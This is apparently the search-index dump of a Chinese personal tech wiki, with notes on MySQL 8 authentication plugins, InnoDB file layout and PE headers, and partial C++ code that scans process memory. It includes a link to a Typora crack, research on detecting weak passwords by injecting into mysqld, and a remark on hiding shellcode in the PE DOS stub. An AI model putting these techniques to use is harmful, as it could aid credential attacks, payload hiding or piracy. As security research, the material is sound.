{"pages":[{"title":"","date":"2023-11-06T11:17:22.659Z","path":"Cover/index.html","text":"🤞👉👇点击图片即可下载 PPT封面通用.pptx 通用背景 封面Qt windows 网络编程 数据结构与算法 C++ 其他"},{"title":"Categories","date":"2023-09-18T05:27:41.920Z","path":"categories/index.html","text":""},{"title":"","date":"2024-05-09T03:50:25.393Z","path":"about/index.html","text":"草台班子 文字不一定准确，但你看到的和听到的一定是你的 满地都是六便士 朋友！你好！加油！"},{"title":"","date":"2024-01-23T05:55:43.938Z","path":"notes/index.html","text":""},{"title":"","date":"2023-09-21T10:05:16.363Z","path":"xmind/index.html","text":"[TOC] 深入理解windows操作系统.xmindQt类图.pngQt 动画框架结构.xind"},{"title":"Tags","date":"2024-01-09T02:07:19.846Z","path":"tags/index.html","text":""},{"title":"关于我","date":"2024-04-16T09:06:01.395Z","path":"more/index.html","text":"个人维护的wiki，涉及工作、学习中用到的技术和方案以及工具 简历我的简历📚文章列表👉Xmind文件🎵音乐🎨封面🔎资源🎨UML"},{"title":"Code","date":"2024-04-18T03:01:06.264Z","path":"more/Demo/index.html","text":"All_Language_Code_Source不区分编程语言，分享的代码段均可以push 博客holdyounger.github.io 语言 Go Python Qt Visual Studio"},{"title":"Music","date":"2023-10-09T08:29:47.356Z","path":"more/music/index.html","text":""},{"title":"ReSource","date":"2023-10-09T08:29:30.106Z","path":"more/resour/index.html","text":"[TOC] 🍳Typora🔧Typora破解🔧Typora主题🍎Viewdll.exe💻内存泄漏检测工具VLD[🧵Cheat Engine](..&#x2F;..&#x2F;resour&#x2F;Cheat Engine&#x2F;CheatEngine75.exe)🔮网速控制工具[🔮Beyond Compare绿色版](..&#x2F;..&#x2F;resour&#x2F;Beyond Compare v4.1.4.20978 x64.exe)🔮PEview🔮OCAM 录屏软件exeinfo.zip"},{"title":"UML","date":"2023-10-09T08:29:15.042Z","path":"more/UML/index.html","text":"UML 绘图[toc] UML 示例散文件升级.puml"},{"title":"【弱密码】MySQL8-Authentication-plugin","date":"2023-12-06T16:00:00.000Z","path":"wiki/MySQL8/【弱密码】MySQL8-plugin.html","text":"概述：MySQL8 身份认证插件相关。本文从插件本身，MySQL版本和使用三个方面记录一下。 身份认证插件MySQL8.0版本（8.0.4版本）在密码认证方式上发生了改变，由原本的 mysql_native_password 改为了 caching_sha2_password，在 8.0.34 版本开始将不再使用 mysql_native_password 验证插件。相应的，客户端连接所使用的 libmysqlclient 也做了修改。 对于高版本的MySQL版本，默认使用的就是 caching_sha2_password 加密方式，但如果是从之前的版本升级的，在连接时可以使用命令行参数 --default-auth 指定验证方式： 1mysql --default-auth=mysql_native_password 新的认证插件总共有两个： sha256_password: sha256加密插件 caching_sha2_passowrd：带缓存的sha256加密插件，认证更快 使用要创建 caching_sha2_password 用户: 12CREATE USER &#x27;sha2user&#x27;@&#x27;localhost&#x27;IDENTIFIED WITH caching_sha2_password BY &#x27;password&#x27;; 配置默认的身份认证插件： 12[mysqld]default_authentication_plugin=caching_sha2_password 配置默认身份认证插件后，创建的用户就默认为 caching_sha2_password 了，再次创建时无需显式声明： 1CREATE USER &#x27;sha2user&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;; 但是如果这时你需要创建 mysql_native_password 的用户，则仍需要显式指明你所需要的插件： 12CREATE USER &#x27;nativeuser&#x27;@&#x27;localhost&#x27;IDENTIFIED WITH mysql_native_password BY &#x27;password&#x27;; 高级配置MySQL8 的身份认证支持自定义的加密过程，可以在未加密连接上使用 RSA 进行加密密码交换。详细操作参考官方说明： MySQL :: MySQL 8.0 参考手册 :: 6.4.1.2 缓存 SHA-2 可插入身份验证"},{"title":"【弱密码】MySQL8-Innodb","date":"2023-11-21T16:00:00.000Z","path":"wiki/MySQL8/【弱密码】MySQL8-ibd.html","text":"概述：MySQL8 ibd文件详解。MySQL8 的InnoDB以及相关文件 .ibd 数据文件的一系列说明文章都可在 jeremy cole 的个人网站上看到，本文仅对其 InnoDB 方面的文章简单翻译和说明。 原文链接：InnoDB – Jeremy Cole 相关文章推荐 InnoDB – Jeremy Cole IBD文件IBD 文件布局 The basics of InnoDB space file layout – Jeremy Cole IBD 主要以 spaces (空间也称作 tablespace) 作为 MySQL 存储的上下文，在 InnoDB 中，对于每一个 MySQL表，都增加了表空间文件，也就是 .ibd 文件，也即“file per table”，比如你创建了一个表 test_user，对应的就会创建一个 test_user.ibd 文件，本篇文章以翻译和记录为主描述 .ibd 文件的文件结构。 IBD 文件结构IBD文件的的主体结构如下所示，分为3部分： 每一个 ibd 文件都有一个38字节的头和8字节的尾。头部包含了一个页面的基础信息，决定了页面其余部分的结构，这一点和PE文件结构基本上一致，文件尾为文件检验和。 文件头和文件尾包含了一下结构（乱序）： Page Type: 页面类型，解析页内容的关键，可被分配的类型包括但不限于 文件空间管理、数据字典、回滚日志等 Space ID: 表空间ID Page Number: 一旦页面被初始化，Page Number 就会被存储在表头，可用于检查当前页面与文件中的偏移量是否匹配。该字段存在时表明当前页已经被初始化了。 Checksum: 一个32位的校验和 Next Page: 指向下一个 Page 的 32位指针。 LSN for last page modification：存储在头部的页面最后修改的64尾日志序列号（LSN）,低32位存储在尾部中（Low 32 bits of LSN）。 Flush LSN：一个64位的LSN字段，存储整个系统中所有页面当中最高的LSN。 页Pages 是表文件的基本单位，每一个pages的大小为 16kib（也就是 $16 * 1024$ bits）。至于为什么是这个大小，Jeremy 在他的文章中表示可能有以下两个原因： 编译时定义 UNIV_PAGE_SIZE 被更改 使用了 InnoDB 对数据进行了压缩 对于每一个 Page，都为其分配了一个 32bit 的整型数字，称作”变异量”，实际上是每个页面与空间开头的偏移量（对于多文件的表空间，不一定是文件）。基于此可知，page0 位于文件偏移0的位置，page10位于文件偏移16384的位置，以此类推。（引申一下 InnoDB 的数据限额，最大允许 64TiB 的容量，也就是 $2^{32} * 1024 Kib &#x3D; 64 TiB$）。 每个表空间的第一页都是文件头的page。一个数据文件由很多个页组成，标准的数据页（INDEX page）组成结构如下所示： 关于页的结构各部分描述如下所示： FIL Header: 文件头，所有页面类型通用部分，索引页有别于其他页的地方是其结构中的 privious page 和 next page 指向了同一级的索引。 INDEX Header: 保存了很多和索引页以及记录管理相关的字段，后文详述。 FSEG Header: FSEG头包含指向次索引所使用的文件段的指针。未被使用的索引页的 FSEG 是被0填充的。 System Records: 在每个页中，InnoDB 都有两个行记录，一个是 infinum，一个是 supremum。这两个记录在页面中的位置是固定的，可以根据页面的自己偏移量直接找到这两个字段。 User records: 真正存储用户数据的区域。每条记录都有一个不定长的表头和实际的数据。表头中包含了下一条记录的指针，该指针按升序记录了下一条记录的偏移量，整体构成一个单链表。 Free Space: 未使用空间 Page Directory: 页目录从 FIL Header 到 FIL Trailer 记录了每一个页的中一些记录的指针（每个页面的第4到第8条记录）。 INDEX Header在每一个索引页中，INDEX Header 都有一个固定的长度和如下所示的结构： INDEX Header 中字段： Number of Directory Slots: 当前页面目录在槽中的大小，每一个槽有 16-bit byte 的大小。 Heap Top Position: 当前使用空间结束位置的偏移量。堆顶和页面目录结束之间的空间都是空闲空间。 Number of Heap Records&#x2F;Format Flag: Format Flag: 当前页的记录格式，存储在 Number of Heap Records 的高位（0x8000）中。总共有两个类型。COMPACT 和 REDUNDANT Number of Heap Records: 当前页面的记录总量，包括系统记录 infimum 和 supremum 以及删除的记录。 First Garbage Record Offset: 指向删除记录链表中第一个的入口。 Garbage Space: 删除记录中已被删除的记录的字节总数。 Last Insert Position: 最后插入页面记录的字节偏移量。 Page Direction: 页面生长方向，LEFT、RIGHT、NO_DIRECTION 三个值。决定了页面是顺序插入还是随机插入。每次插入时，都会读取最后插入位置的记录，并将其键与当前插入记录的键进行比较，然后确定插入的方向。 Number of Inserts in Page Direction: 当 Page Direction 被设置后，任何被插入的数据都不能重置方向，但是会递增当前值。 Number of Records: 当前页面中未被删除的用户记录数量。 MaxiMum Transaction ID: 当前页面中所有记录中最大的事务ID。 Page Level: 当前页面在索引中的级别。叶子节点的级别为 0, B+树的级别一次递增。 Index ID: 当前页面所属ID 关于记录指针（Record pointer）： 记录指针被用在服务的不同地方。INDEX Header 中的最后一次插入位置字段、所有页目录的值、以及系统中下一条记录、用户记录。所有的记录都包含了一个头（可变长），然后后边跟着一个实际的数据（可变长）。Record pointers 指向了记录数据中的第一个字节，实际上是介于头和记录数据之间。这样就可以通过从该位置向后读取头，并从该位置读取记录数据。 由于系统记录和用户记录的Next指针总是指向 Header 中的第一个字段，因此从这个指针向后读取，就可以非常高效的读取一整个页面而不用解析可变长的数据记录。 System records: infimum and supermum每一个索引页都包含两个系统记录，infimum 和 supermum, 存储在固定的位置（依次 偏移位置 99 和 112）。结构如下所示： 两个系统记录前都有一个典型的记录头，并且 infimum 和 supremum 是这两个系统记录的唯一值。只需要关注系统记录前的记录头即可。 The infimum record infimum record 表示比当前页面任何键值都低的值。它的 Next record 指针指向了页面中键值最低的用户记录。infimum 是按序扫描用户数据的一个固定入口点。 The supremum record supremum record 表示比当前页面任何键值都高的值。它的 Next record 始终为0（由于页头的问题，记录了一条无效地实际数据），页面中键值最高的用户记录的下一条记录总是指向supremum。 User records原作：The physical structure of InnoDB index pages – Jeremy Cole 用户表比较复杂，原作者在之后的文章中可能会详细描述。 用户记录会按照插入的顺序添加到页面（并且可以从先前删除的记录中获取现有的可用空间），并且使用每个记录中的 next record 按升序构成一条单链表。一个单链表从最小值开始。并在最大值处结束。使用这个链表可以扫描页面中的所有用户记录。 这就意味着使用这个单链表按照升序从一页扫描到另一个很简单，从而遍历整个索引。大致如下： 从索引页的第一页（lowest key）开始(这个页面是通过遍历B+树找到的)。 读取 infimum, 然后跟踪它的 next record 指针。 如果记录是 supremum, 则继续执行步骤5，如果不是，继续读取并处理文件 跟踪 next record 指针，然后继续步骤3 如果 next record 指针指向 NULL，则退出，如果没有，则继续跟踪 next page，然后执行步骤2。 The page directory页目录开始于文件尾，然后“向下”扩展到用户记录。页目录包含了一个指向 4-8条记录的指针。此外还包含了一个 infimum 和 supremum 的入口地址。 页面目录只是一个动态大小的 16 位偏移指针数组，指向页面内的记录。作者暂时还没有展开细讲。 Free Space内存位于用户记录（向上增长）和页目录（向下增长）的空间就是闲置空间。一旦用户空间和页目录相遇，也就是闲置空间也被占用，就代表当前页已满。"},{"title":"【弱密码】MySQL8 安装及插件导出","date":"2023-12-10T16:00:00.000Z","path":"wiki/MySQL8/【弱密码】MySQL8-安装及插件机制.html","text":"概述：MySQL 8 弱密码预研说明，根据目前的调研结果，暂时只能通过注入并调用的方式来检测，且这种方式会触发 MySQL 防爆破策略。 mysql 认证相关接口均以插件形式，全局导出了插件的列表 1Cached_authentication_plugins * g_cached_authentication_plugins 0000000147BB31D0 13573 mysql 8.0.34 版本及之后共有三个插件： sha256_password mysql_native_password caching_sha2_password 可以获取到这三个插件，但是 mysql 的安全机制上，没有办法调用插件对应的函数接口。在每个插件函数接口的内部都是通过 THD 的变量传递登录信息和登录结果的。 1234THD *thd = current_thd;if (!thd-&gt;m_disable_password_validation) &#123; if (my_validate_password_policy(inbuf, inbuflen)) return 1;&#125; 插件导出接口的详细说明可查看这篇文章 【弱密码】MySQL8-密码Function 安装及启动 设置环境变量，path添加 mysql\\bin 目录 mysqld install mysqld -–initilalize –-console net start mysql 登录后修改密码 alter user root@localhost identified by &#39;Admin@123&#39;; 创建不同插件的用户 create USER mnpweak2 IDENTIFIED WITH mysql_native_password BY &#39;admin123&#39;; 相关导出接口声明 1234567891011121314151617181920typedef MYSQL * (__stdcall *pfn_mysql_init)(MYSQL *mysql);typedef int(__stdcall *pfn_mysql_options)(MYSQL *mysql, enum mysql_option option, const void *arg);typedef MYSQL * (__stdcall *pfn_mysql_real_connect)(MYSQL *mysql, const char *host, const char *user, const char *passwd, const char *db, unsigned int port, const char *unix_socket, unsigned long clientflag);typedef int(__stdcall *pfn_mysql_query)(MYSQL *mysql, const char *q);typedef int(__stdcall *pfn_mysql_real_query)(MYSQL *mysql, const char *q, unsigned long length);typedef MYSQL_RES * (__stdcall *pfn_mysql_store_result)(MYSQL *mysql);typedef unsigned int(__stdcall *pfn_mysql_num_fields)(MYSQL_RES *mysql);typedef MYSQL_FIELD * (__stdcall *pfn_mysql_fetch_field)(MYSQL_RES *mysql);typedef MYSQL_ROW(__stdcall *pfn_mysql_fetch_row)(MYSQL_RES *mysql);typedef const char * (__stdcall *pfn_mysql_error)(MYSQL *mysql);typedef void(__stdcall *pfn_mysql_close)(MYSQL *sock);typedef std::pair&lt;bool, bool&gt;(__stdcall *fastAuthenticate)(const std::string &amp;authorization_id, const unsigned char *random, unsigned int random_length, const unsigned char *scramble, bool check_second); // 此外还导出了两个插件 st_mysql_plugin *m_builtin_caching_sha2_password_plugin = NULL; st_mysql_plugin *m_builtin_mysql_password_plugin = NULL; 获取 1234567891011121314m_ptr_mysql_init = (pfn_mysql_init)GetProcAddress(hExe, &quot;mysql_init&quot;);m_ptr_mysql_options = (pfn_mysql_options)GetProcAddress(hExe, &quot;mysql_options&quot;);m_ptr_mysql_real_connect = (pfn_mysql_real_connect)GetProcAddress(hExe, &quot;mysql_real_connect&quot;);m_ptr_mysql_query = (pfn_mysql_query)GetProcAddress(hExe, &quot;mysql_query&quot;);m_ptr_mysql_real_query = (pfn_mysql_real_query)GetProcAddress(hExe, &quot;mysql_real_query&quot;);m_ptr_mysql_store_result = (pfn_mysql_store_result)GetProcAddress(hExe, &quot;mysql_store_result&quot;);m_ptr_mysql_num_fields = (pfn_mysql_num_fields)GetProcAddress(hExe, &quot;mysql_num_fields&quot;);m_ptr_mysql_fetch_field = (pfn_mysql_fetch_field)GetProcAddress(hExe, &quot;mysql_fetch_field&quot;);m_ptr_mysql_fetch_row = (pfn_mysql_fetch_row)GetProcAddress(hExe, &quot;mysql_fetch_row&quot;);m_ptr_mysql_error = (pfn_mysql_error)GetProcAddress(hExe, &quot;mysql_error&quot;);m_ptr_mysql_close = (pfn_mysql_close)GetProcAddress(hExe, &quot;mysql_close&quot;);m_builtin_caching_sha2_password_plugin = (st_mysql_plugin*)GetProcAddress(hExe, &quot;builtin_caching_sha2_password_plugin&quot;);m_builtin_mysql_password_plugin = (st_mysql_plugin*)GetProcAddress(hExe, &quot;builtin_mysql_password_plugin&quot;);"},{"title":"首页","date":"2024-01-23T06:09:04.129Z","path":"wiki/stellar/index.html","text":"Stellar 项目介绍 整理记录 Stellar 主题的一些用法和修改点"},{"title":"layout使用说明","date":"2024-01-23T06:09:04.131Z","path":"wiki/stellar/layout说明.html","text":"layout使用说明"},{"title":"Stellar 主题使用说明","date":"2024-01-23T06:09:04.121Z","path":"wiki/stellar/主题使用说明.html","text":"Stellar 主题使用说明"},{"title":"【PE】PE文件结构1","date":"2024-04-17T02:16:13.370Z","path":"wiki/PE/【PE】PE文件结构1.html","text":"概述：PE文件结构基础认识之DOS头和PE头（以 rpcrt4.dll 为例分析） 参考文章： ‘PE文件格式学习（一）概述 - CodeAntenna‘ 0x01 前言PE(Portable Executable)，即可移植的执行体。 Linux平台：ELF（Executable and Linking Format）文件结构。 Windows平台下，所有的可执行文件。诸如：exe、dll、sys、ocx、com等均适用PE文件结构，这些使用PE文件结构也被称为PE文件。 0x02 PE结构PE 结构是由若干个复杂的结构体组合而成的，不是单单的一个结构体那么简单，它的结构就像文件系统的结构是由多个结构体组成的。PE结构 包含的结构体有 DOS 头、PE 标识、文件头、可选头、目录结构、节表等。如下图所示： DOS头DOS头中声明用的寄存器(我们可以看到e_ss、e_sp、e_ip、e_cs还是16位的寄存器)，所以在32位&#x2F;64为系统中用到的只有两个成员了（第一个和最后一个）。无论是32位还是64位PE文件，其文件的头部必定是DOS头。大小为 &#x3D;&#x3D;40H(64字节)&#x3D;&#x3D;。相关结构如下所示： 123456789101112131415161718192021222324// WORD 为2字节// DWORD 为4字节typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header(※Magic DOS signature MZ(4Dh 5Ah):MZ标记) WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; DOS 头又分为两部分，&#x3D;&#x3D;MZ头部&#x3D;&#x3D; 和 &#x3D;&#x3D;DOS存根&#x3D;&#x3D;。 MZ头部 MZ文件头：IMAGE_DOS_HEADER 结构体，其大小占64个字节，并且该结构中的最后一个LONG类型e_lfanew成员指向PE文件头的位置为中的PE文件头标志的地址。DOS头中有两个重要的成员，分别是 e_magic 和 e_lfanew，如PE文件结构说明一图所示： e_magic：对应 MZ标识(固定值) ，也就是 0x5A4D e_lfanew: 指pe的偏移量，对应的PE数据块的基地址 DOS存根（DOS stub）DOS头(IMAGE_DOS_HEADER)和PE头(IMAGE_NT_HEADERS)中间的空余位置是一些垃圾值以及编译器填充的一些 *The is program cannot be run in DOS mode.*或 This program must be run under Win32 等信息。这些信息就是 DOS存根。DOS存根实际上是一段汇编代码。用于在DOS环境下启动PE文件时输出一些上述文本。 在pe文件利用的时候，我们可以把payload写入到当前区域，诸如存放我们的shellcode，在读取时，获取dos头字节数，减去MZ头字节数，即为dos存根字节大小。然后拿去操作加载shellcode等。 PE头在MS-DOS头下main，就是PE头，PE头是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，其中包含许多PE装载器用到的重要字段。PE头又分为标准PE头和可选PE头，其同为NT结构的成员： IMAGE_NT_HEADER数据结构定义： 1234567//NT头//pNTHeader = dosHeader + dosHeader-&gt;e_lfanew;struct _IMAGE_NT_HEADERS&#123; 0x00 DWORD Signature; //PE文件标识:ASCII的&quot;PE\\0\\0&quot; 0x04 _IMAGE_FILE_HEADER FileHeader; 0x18 _IMAGE_OPTIONAL_HEADER OptionalHeader;&#125;; 根据DOS头的e_lfanew成员我们就可以找到NT头，NT头的第一个成员Signature是PE\\0\\0（0X50 0X45 0X00 0X00四字节的签名），后两个成员则分别是标准PE头FileHeader（_IMAGE_FILE_HEADER）和OptionalHeader可选PE头（_IMAGE_OPTIONAL_HEADER）。 PE标识 Signature将文件标识为 PE 映像的 4 字节签名。字节为PE\\0\\0。这个字段是PE文件的标志字段，通常设置成 00004550h，其ASCII码为 PE00，这个字段是PE文件头的开始，前面的DOS_HEADER结构中的字段e_lfanew字段就是指向这里。 文件头 FileHeader文件头结构体为 _IMAGE_FILE_HEADER，见IMAGE_FILE_HEADER (winnt.h) - Win32 apps | Microsoft Learn。结构体成员变量如下所示： 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //运行平台 WORD NumberOfSections; //文件的区块数目 DWORD TimeDateStamp; //文件创建的用时间戳标识的日期 DWORD PointerToSymbolTable; //指向符号表（用于调试） DWORD NumberOfSymbols; //符号表中符号的个数 WORD SizeOfOptionalHeader; //IMAGE_OPTIONAL_HEADER32结构大小 WORD Characteristics; //文件属性&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 参照上述结构体，分析一下 rpcrt4.dll 的 FileHeader 成员。 PE头存储内容如下所示： 1234Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F000000E0 50 45 00 00 4C 01 06 00 PE L 000000F0 77 7B 41 86 00 00 00 00 00 00 00 00 E0 00 02 21 w&#123;A? ? ! 现在有数据也知道结构体，可以根据存储的内容知道 rpcrt4.dll 的一些信息了（地址是由低位向高位增长的，这里直接复制粘贴了，读者知道这回事就行） 成员变量 Machine NumberOfSections TimeDateStamp PointerToSymbolTable NumberOfSymbols SizeOfOptionalHeader Characteristics 大小 WORD WORD DWORD DWORD DWORD WORD WORD 值 4C 01 06 00 77 7B 41 86 00 00 00 00 00 00 00 00 E0 00 02 21 说明 0x014C 表示当前体系结构类型为 x86 当前PE文件的节数，当前所示有 6 个 当前PE文件的时间戳 符号表的偏移量（以字节为单位），如果没有 COFF 符号表，则为 0 符号表中的符号数，当前为 0 可选文件头大小，当前所示有 224 个 图像的特征 0x2102 补充 机器标识 标识区块的数目，关于区块后面会详细讲 指的就是PE文件创建的事件，这个时间是指从1970年1月1日到创建该文件的所有的秒数 紧跟着IMAGE_FILE_HEADER后面的数据大小，这也是一个数据结构，它叫做IMAGE_OPTIONAL_HEADER,其大小依赖于是64位还是32位文件。32位文件值通常是00EOh，对于64位值通常为00F0h 普通EXE文件这个字段值为010fh，DLL文件这个字段一般是0210h 最后一个参数图像特征 Characteristics 的值 0x2102 的说明 0x2000 该图像是一个DLL文件，虽然是可执行文件，但不能直接运行 0x0100 计算机支持32位 0x0002 该文件是可执行文件，（没有未解析的外部引用） 可选头 OptionalHeader可选PE头紧接着标准PE头，其大小在标准PE头中给出：大小为 E0H 即224字节。_IMAGE_OPTIONAL_HEADER结构如下所示： WinNT.h 中的实际 结构IMAGE_OPTIONAL_HEADER32命名 ， IMAGE_OPTIONAL_HEADER 定义为 IMAGE_OPTIONAL_HEADER32。 但是，如果定义了 _WIN64 ，则 IMAGE_OPTIONAL_HEADER 定义为 IMAGE_OPTIONAL_HEADER64。 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // /*+0x00*/ WORD Magic; // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh） /*+0x02*/ BYTE MajorLinkerVersion; // 链接程序的主版本号 /*+0x03*/ BYTE MinorLinkerVersion; // 链接程序的次版本号 /*+0x04*/ DWORD SizeOfCode; // 所有含代码的节的总大小 /*+0x08*/ DWORD SizeOfInitializedData; // 所有含已初始化数据的节的总大小 /*+0x0c*/ DWORD SizeOfUninitializedData; // 所有含未初始化数据的节的大小 /*+0x10*/ DWORD AddressOfEntryPoint; // 程序执行入口RVA /*+0x14*/ DWORD BaseOfCode; // 代码的区块的起始RVA /*+0x18*/ DWORD BaseOfData; // 数据的区块的起始RVA // // NT additional fields. 以下是属于NT结构增加的领域。 // /*+0x1c*/ DWORD ImageBase; // *程序的首选装载地址 /*+0x20*/ DWORD SectionAlignment; // *内存中的区块的对齐大小 /*+0x24*/ DWORD FileAlignment; // *文件中的区块的对齐大小 /*+0x28*/ WORD MajorOperatingSystemVersion; // 要求操作系统最低版本号的主版本号 /*+0x2a*/ WORD MinorOperatingSystemVersion; // 要求操作系统最低版本号的副版本号 /*+0x2c*/ WORD MajorImageVersion; // 可运行于操作系统的主版本号 /*+0x2e*/ WORD MinorImageVersion; // 可运行于操作系统的次版本号 /*+0x30*/ WORD MajorSubsystemVersion; // 要求最低子系统版本的主版本号 /*+0x32*/ WORD MinorSubsystemVersion; // 要求最低子系统版本的次版本号 /*+0x34*/ DWORD Win32VersionValue; // 莫须有字段，不被病毒利用的话一般为0 /*+0x38*/ DWORD SizeOfImage; // 映像装入内存后的总尺寸 /*+0x3c*/ DWORD SizeOfHeaders; // 所有头+区块表的尺寸大小 /*+0x40*/ DWORD CheckSum; // 映像的校检和 /*+0x44*/ WORD Subsystem; // 可执行文件期望的子系统 /*+0x46*/ WORD DllCharacteristics; // DllMain()函数何时被调用，默认为0 /*+0x48*/ DWORD SizeOfStackReserve; // 初始化时的栈大小 /*+0x4c*/ DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小 /*+0x50*/ DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 /*+0x54*/ DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小 /*+0x58*/ DWORD LoaderFlags; // 与调试有关，默认为0 /*+0x5c*/ DWORD NumberOfRvaAndSizes; // 下边数据目录的项数，这个字段自Windows NT发布以来，一直是16 /*+0x60*/ IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // *数据目录表&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 上述共计 31 个字段，常用的一般是加*的几个。这里还是简单的按照内存和结构体一一对应分析看下。 内存如下所示： 成员变量 大小 值 说明 补充 Magic WORD 0B 01 映像文件的状态，0x01 标识当前是可执行映像 MajorLinkerVersion BYTE 0E 链接器的主要版本号，当前是 14 MinorLinkerVersion BYTE 14 链接器的次要版本号，当前是 20 SizeOfCode DWORD 00 C2 0A 00 如果有多个代码节，则为代码节的大小（以字节为单位）或所有此类节的总和。 SizeOfInitializedData DWORD 00 EA 00 00 初始化的数据节的大小。代码节的大小或所有此类节的总和 SizeOfUninitializedData DWORD 00 00 00 00 未初始化数据节的大小 AddressOfEntryPoint DWORD 50 D3 03 00 指向入口点函数的指针 BaseOfCode DWORD 00 10 00 00 指向代码部分的开头的指针 BaseOfData DWORD 00 E0 0A 00 指向数据部分开头（相对于图像基数）的指针。 ImageBase DWORD 00 00 F8 4E 图像加载到内存中的第一个字节的首选地址。 此值是 64K 字节的倍数。 DLL 的默认值为 0x10000000。 应用程序的默认值为 0x00400000，0x00010000 Windows CE除外。 SectionAlignment DWORD 00 10 00 00 内存中加载的节的对齐方式（以字节为单位）。 此值必须大于或等于 FileAlignment 成员。 默认值是系统的页大小。 FileAlignment DWORD 00 02 00 00 图像文件中各部分的原始数据的对齐方式（以字节为单位）。 该值应为介于 512 和 64K 之间的幂 (（含) ）。 默认值为 512。 如果 SectionAlignment 成员小于系统页面大小，则此成员必须与 SectionAlignment 相同。 MajorOperatingSystemVersion WORD 0A 00 所需操作系统的主版本号。 0x0A 为 10 MinorOperatingSystemVersion WORD 00 00 所需操作系统的次要版本号。 MajorImageVersion WORD 0A 00 映像的主版本号。 MinorImageVersion WORD 00 00 映像的次要版本号。 MajorSubsystemVersion WORD 0A 00 子系统的主版本号。 MinorSubsystemVersion WORD 00 00 子系统的次要版本号。 Win32VersionValue DWORD 00 00 00 00 此成员是保留的，必须为 0。 SizeOfImage DWORD 00 F0 0B 00 图像的大小（以字节为单位），包括所有标头。 必须是 SectionAlignment 的倍数。 SizeOfHeaders DWORD 00 04 00 00 以下项的组合大小，舍入为 FileAlignment 成员中指定的值的倍数。 CheckSum DWORD 3B 06 0C 00 映像文件校验和。 以下文件在加载时进行验证：所有驱动程序、在启动时加载的任何 DLL，以及加载到关键系统进程中的任何 DLL。 Subsystem WORD 03 00 运行此映像所需的子系统。 定义了以下值。 0x03 标识 windows 字符膜片式用户界面（CUI）系统 DllCharacteristics WORD 40 41 图像的 DLL 特征。 定义了以下值。 SizeOfStackReserve DWORD 00 00 04 00 SizeOfStackCommit DWORD 00 10 00 00 SizeOfHeapReserve DWORD 00 00 10 00 SizeOfHeapCommit DWORD 00 10 00 00 LoaderFlags DWORD 00 00 00 00 NumberOfRvaAndSizes DWORD 10 00 00 00 DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES] IMAGE_DATA_DIRECTORY 16个指针地址，大小为 80H 这个是一个指针类型，指向 IMAGE_DATA_DIRECTORY 结构的指针。会根据传入的索引号返回不同指向的结构体 最后一个成员变量结构体如下所示，详见IMAGE_DATA_DIRECTORY (winnt.h) - Win32 apps | Microsoft Learn： 12345struct _IMAGE_DATA_DIRECTORY&#123; DWORD VirtualAddress; DWORD Size;&#125;;//占用16*8 = 128Byte = 80H = E0H(可选PE头默认大小) - 60H(前面所有成员固定占用大小) 关于最后一个成员变量，可枚举的 IMAGE_NUMBEROF_DIRECTORY_ENTRIES 索引总共有15个，外加一个保留指针。也就是说，在 DataDirectory 位置存放了 16 个指针。可以参考之前的PE头对照一下，剩下的PE内存刚好存放了 16 个指针，参考 PE 块的总大小，剩下的部分大小也刚好为 $80h$ 。 $ 16 * 8 &#x3D; 128 &#x3D; 80H$ 如下图所示： 节表下篇文章记录 节表数据下篇文章记录 0x03补充一段代码，演示简单获取 Section 各个段的信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101ULONGLONG FindSignatureCode::operator()(CString module, std::vector&lt;ULONG&gt; signatureCodes)&#123; DBGTRACE; if (signatureCodes.size() == 0) &#123; return 0; &#125; ULONGLONG addr = 0; DWORD cbSize; HMODULE* pHmodule = NULL; ModuleSectionInfo_T ModuleSectionInfo; HANDLE hModuleSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId()); // 模块快照句柄 MODULEENTRY32 me32 = &#123; 0 &#125;; // 模块入口 me32.dwSize = sizeof(MODULEENTRY32); // 申请空间 // 打印模块名 while (::Module32Next(hModuleSnap, &amp;me32)) &#123; if (module.CompareNoCase(me32.szModule) == 0) &#123; Debug_Run(L&quot;Find Module(%s)&quot;, me32.szModule); break; &#125; &#125; ULONGLONG ulModuleBase = (ULONGLONG)me32.modBaseAddr; ULONGLONG ulModuleSize = (ULONGLONG)me32.modBaseSize; HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, GetCurrentProcessId()); CHAR* szBuffer = new CHAR[ulModuleSize]; ZeroMemory(szBuffer, ulModuleSize); SIZE_T sReadSize = 0; if (ReadProcessMemory(hProcess, (LPCVOID)ulModuleBase, szBuffer, ulModuleSize, &amp;sReadSize)) &#123; for (size_t offset = 0; offset &lt; ulModuleSize - signatureCodes.size() * 4; offset++) &#123; int i = 0; for (; i &lt; signatureCodes.size(); i++) &#123; ULONGLONG ReadMem = 